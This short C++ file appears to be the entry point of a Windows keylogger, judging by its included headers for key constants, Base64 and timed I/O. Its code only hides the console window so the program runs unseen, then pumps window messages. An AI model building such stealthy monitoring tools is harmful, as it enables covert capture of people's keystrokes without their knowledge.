#include <iostream>
#include <string>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
using namespace std;

int main(int argv, char* argc[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}